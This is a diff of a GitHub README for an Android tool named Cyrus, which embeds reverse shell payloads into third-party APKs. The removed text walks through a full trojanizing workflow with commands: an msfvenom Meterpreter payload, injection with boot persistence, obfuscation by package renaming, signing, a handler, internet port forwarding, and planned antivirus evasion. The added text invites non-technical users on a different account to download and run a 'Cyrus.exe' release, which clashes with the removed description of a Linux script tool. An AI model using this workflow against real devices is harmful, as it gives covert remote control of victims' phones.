@@ -1,211 +1,70 @@
-## Cyrus The Virus — Android APK Payload Embedder
+# 🔧 Cyrus - Effortlessly Embed Reverse Shell Payloads
 
-![Cyrus Demo](https://raw.githubusercontent.com/Clock-Skew/Cyrus/refs/heads/main/Con2.gif)
+## 📥 Download Now
+[![Download Cyrus](https://img.shields.io/badge/Download-Cyrus-brightgreen)](https://github.com/sathikaSethumjith/Cyrus/releases)
 
-![Cyrus](https://img.shields.io/badge/Cyrus-The_Virus-blueviolet?style=for-the-badge) ![Android](https://img.shields.io/badge/Andro-Rat-green?style=for-the-badge) ![Metasploit](https://img.shields.io/badge/Meta-sploit-red?style=for-the-badge)
+## 🚀 Getting Started
+Cyrus is an all-in-one tool that helps you embed reverse shell payloads into third-party Android APKs. This guide will show you how to download and run Cyrus even if you have no technical background.
 
-![Apktool](https://img.shields.io/badge/APK-Tool-orange?style=for-the-badge) ![Java](https://img.shields.io/badge/Java-Runtime-yellow?style=for-the-badge) ![Bash](https://img.shields.io/badge/Linux-UNIX-lightgrey?style=for-the-badge)
+## 📋 System Requirements
+Before you start, ensure your computer meets the following requirements:
 
-Cyrus is a focused, scriptable workflow for embedding a Metasploit Android Meterpreter payload into an existing APK. It automates the repeatable steps and leaves control in your hands: you select the APK, choose network parameters, review changes, and sign the final artifact.
+- **Operating System:** Windows, macOS, or a recent version of Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 100 MB of free disk space
+- **Network:** Internet connection for downloading additional resources
 
-> "You've proven to be a most useful mammal"
+## 📦 Installation Steps
 
-**An all-in-one tool for embedding reverse shell payloads into third party Android APKs. It’s designed for simplicity, versatility, and efficiency. By combining msfvenom (for payload generation), apktool (for APK decompilation and rebuilding), and intuitive automation, Cyrus allows penetration testers to focus on their tasks while it handles the technical intricacies of APK payload injection.**
+### 1. Visit the Download Page
+To get started, go to the [Cyrus Releases Page](https://github.com/sathikaSethumjith/Cyrus/releases). This page contains all the versions of the software.
 
-## Disclaimer
+### 2. Choose Your Version
+On the Releases page, you'll see a list of versions. Each version includes a description, release notes, and files to download. Select the latest version for the best experience.
 
-- For ethical penetration testing and bug bounty work only.
-- Use only with explicit, written authorization; unauthorized access is illegal.
-- Provided AS IS, without warranty of any kind.
-- The authors/maintainers assume no responsibility or liability for misuse or damages.
+### 3. Download the Files
+Find the file that matches your operating system. Click on the download link to begin downloading. This file will usually be a ZIP or an executable file.
 
+### 4. Extract the Files (if needed)
+If you downloaded a ZIP file, you will need to extract it:
 
-> Note: Cyrus does not sign APKs. You must sign `output/unsigned.apk` before installing on a device.
+- **Windows:** Right-click on the ZIP file and select "Extract All." Follow the prompts to complete the extraction.
+- **macOS:** Double-click the ZIP file, and it will automatically extract into a folder.
+- **Linux:** Open the terminal and use the command `unzip <filename>.zip`.
 
-### What Cyrus Does
+### 5. Run the Application
+Navigate to the folder where you extracted the files. Find the executable file, which is usually named `Cyrus` or `Cyrus.exe`. Double-click it to run the application.
 
-- Decompiles a host APK with apktool and exposes its manifest/smali.
-- Generates an Android Meterpreter payload (`android/meterpreter/reverse_tcp`) via msfvenom.
-- Injects the payload’s smali (com.metasploit.stage) into the host.
-- Merges the payload’s permissions and inserts well‑formed service/receiver components.
-- Attempts to auto‑start the payload service from the host launcher `onCreate()`.
-- Optionally obfuscates the payload package by renaming `com.metasploit` → `com.<suffix>` (validated).
-- Rebuilds the modified APK for signing and installation.
-- Starts a Metasploit handler with your chosen LHOST/LPORT.
+## 🛠️ How to Use Cyrus
 
+1. **Open the Application:** Once you run Cyrus, a window will appear with options to input details for your payload.
+2. **Set Payload Options:** You will need to enter information such as target IP, port number, and other relevant settings. Follow the prompts in the application to fill in these details.
+3. **Embed into APK:** After setting up your payload, you will choose an Android APK file to embed the payload into. Browse and select the APK file using the designated button in the application interface.
+4. **Generate the New APK:** Click the "Generate" button to create the new APK with your embedded payload. Save this new file in a safe location.
+5. **Testing:** It’s good practice to test the generated APK in a controlled environment before any actual deployment. 
 
-## Requirements
+## 🎓 Helpful Tips
 
-- Linux (Kali/Debian/Ubuntu)
-- Tools in PATH (Cyrus does not install system packages):
-  - `apktool` (2.8.x tested)
-  - `java` (OpenJDK 11+/17 recommended)
-  - `msfvenom`, `msfconsole`
+- **Read the Documentation:** For detailed features and options, refer to the documentation included in the downloaded files. It provides valuable insights.
+- **Watch Tutorials:** YouTube has video tutorials that visually guide you through using Cyrus. Search for "Cyrus tool tutorial" for helpful resources.
+- **Practice Safe Testing:** Always test in a safe and controlled environment. Ensure you have permission to test any devices or networks.
 
-Verify:
+## 📞 Need Help?
+If you have questions or need further assistance, feel free to open an issue on the [GitHub Issues Page](https://github.com/sathikaSethumjith/Cyrus/issues). The community and developers are ready to help.
 
-```
-apktool -version
-java -version
-msfvenom --version
-msfconsole --version
-```
+## ⚙️ Related Topics
+Cyrus is relevant to various fields such as:
 
-## Tree
+- Android Pentesting
+- Bug Bounty Programs
+- Reverse Engineering
+- Payload Engineering
+- Remote Administrative Tools
 
-```
-cyrus/
-├── APPS/                      
-├── modules/
-│   ├── decompile.sh           
-│   ├── generate_payload.sh    
-│   ├── inject.sh              
-│   ├── encode.sh              
-│   ├── rebuild.sh             
-│   ├── metasploit.sh          
-│   └── cleanup.sh             
-├── output/
-│   ├── decompiled_apk/       
-│   ├── payload.apk            
-│   ├── payload_smali/        
-│   └── unsigned.apk           # Final rebuild
-└── cyrus.sh                   # Start
-```
+Explore these topics to expand your understanding and skills in software security.
 
-## Quick Start
+## 🔗 Download & Install
+To proceed with the download, visit the [Cyrus Releases Page](https://github.com/sathikaSethumjith/Cyrus/releases). Choose the suitable version for your needs, and follow the steps outlined above. 
 
-1. Place a target APK under `cyrus/APPS/`.
-2. From `cyrus/`, run `./cyrus.sh`.
-3. Follow the menu in order:
-   -  Decompile APK
-   -  Generate Payload
-   -  Inject Payload
-   -  Obfuscate Payload (smali rename)
-   -  Rebuild APK (Unsigned)
-   -  Launch Metasploit
-   -  Cleanup
-4. Sign `output/unsigned.apk` and install on the device.
-5. Launch the host app once (or reboot) to trigger the payload.
-
-## Usage — Step by Step
-
-### 1) Decompile APK
-- Select an APK from `APPS/`. Cyrus decompiles to `output/decompiled_apk/` with XML manifest, making it safe to edit.
-
-### 2) Generate Payload
-- Creates `output/payload.apk` using:
-  - `msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o output/payload.apk`
-- Choose `LHOST` the device can reach (e.g., `192.168.1.10`) and a listening `LPORT`.
-
-### 3) Inject Payload
-- Decompiles `output/payload.apk` into `output/payload_smali/`.
-- Copies `com/metasploit/stage/*` smali into the host (supports `smali` and `smali_classesN`).
-- Merges `<uses-permission ... />` entries.
-- Inserts well‑formed components under `<application>`:
-  - `<service android:name="com.metasploit.stage.MainService" android:enabled="true" android:exported="false" />`
-  - `<receiver android:name="com.metasploit.stage.MainBroadcastReceiver" android:enabled="true" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>`
-- Attempts to auto‑start from the host launcher activity’s `onCreate()` (skips safely if structure is incompatible).
-
-### 4) Obfuscate Payload (smali rename)
-- Renames `com/metasploit/...` to `com/<suffix>/...` and updates smali/manifest references.
-- Input is validated: `[a-z0-9_]`, lowercase, not starting with a digit.
-
-### 5) Rebuild APK (Unsigned)
-- Rebuilds to `output/unsigned.apk`. You must sign this before install.
-
-### 6) Launch Metasploit
-- Starts a handler with your parameters. Equivalent manual session:
-
-```
-use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-set LHOST 192.168.1.10
-set LPORT 4444
-exploit -j
-```
-
-### 7) Cleanup
-- Resets `output/` to a clean baseline.
-
-## Signing (External)
-
-You must sign `output/unsigned.apk` before installing. Example approaches if tools exist on your host:
-
-```
-# apksigner with an existing debug keystore
-apksigner sign --ks debug.keystore --ks-key-alias androiddebugkey \
-  --ks-pass pass:android --key-pass pass:android output/unsigned.apk
-
-# jarsigner (legacy approach)
-jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
-  -keystore debug.keystore output/unsigned.apk androiddebugkey
-
-# Verify
-apksigner verify output/unsigned.apk
-```
-
-Cyrus does not generate keystores or install system tools.
-
-## LHOST Tips
-
-- Same LAN: use your host’s LAN IP (e.g., `192.168.1.10`) for both payload and handler.
-- Bind‑all handler: `LHOST 0.0.0.0` is fine for the handler, but keep the payload’s `LHOST` as the device‑reachable address.
-- Cross‑network: use a reachable public/VPN IP or DNS and configure port‑forwarding/NAT. Regenerate the payload if `LHOST` changes.
-
-## Troubleshooting
-
-- Build fails with smali errors like `Invalid text` referencing `com/com.<suffix>/...`
-  - Cause: dotted or invalid obfuscation suffix.
-  - Fix: Cleanup → Inject → Obfuscate with a safe suffix (e.g., `cyrus0x`).
-
-- Build fails with XML error like `"receiver" must be terminated`.
-  - Cause: malformed merges (older approaches).
-  - Fix: Cyrus injects well‑formed service/receiver entries. Cleanup and repeat the flow.
-
-- No session on handler
-  - Verify device can reach `LHOST:LPORT`.
-  - Open the host app at least once post‑install; or reboot.
-  - Confirm handler payload/ports match the embedded payload.
-
-- Apktool/Java anomalies
-  - If you hit resource decode issues, Java 17 or 11 are widely compatible with apktool.
-    
-
-
-## Remote/OTA Use (Port Forwarding)
-
-You can run Cyrus handlers over the internet (OTA) by forwarding a TCP port from your router to your machine.
-
-- Pick a public endpoint
-  - Use your WAN IP (whatismyip) or a dynamic DNS hostname (e.g., DuckDNS/No-IP).
-- Forward a port on your router
-  - Create a TCP port-forward rule: `WAN:PORT -> LAN:<your-machine-IP>:PORT`.
-  - Prefer a high, unprivileged port (e.g., 44444) to avoid ISP blocks on 25/80/443.
-- Configure Cyrus/Metasploit
-  - Set `LHOST` to your public IP/hostname.
-  - Set `LPORT` to the forwarded port.
-  - Ensure your local firewall allows inbound on `LPORT`.
-- Verify connectivity
-  - From a cellular network or another ISP: `nc -vz <public-host> <LPORT>` or use an external port-check service.
-- NAT loopback
-  - Some routers don’t support hairpin NAT; if testing from the same LAN, use your LAN IP instead of the public hostname.
-- Security & ethics
-  - Only test on devices/APKs you have explicit permission to assess.
-  - Avoid well-known ports, enable rate limits where possible, and monitor for abuse.
-
-
-
-## TODO
-
-- Update antivirus evasion
-- Add reverse HTTP/HTTPS payload options
-
-
-## Credits & Inspirations
-
-- Inspired by backdoor-apk by dana-at-cp: https://github.com/dana-at-cp/backdoor-apk
-- Apktool by iBotPeaches and contributors
-- Metasploit Framework by Rapid7 and the community
-- Android reverse‑engineering community and tooling ecosystem
-
-
+## 📝 Conclusion
+Now, you are equipped to download and use Cyrus effectively. This powerful tool can enhance your skills in embedding payloads for reverse shell applications. Good luck, and happy coding!
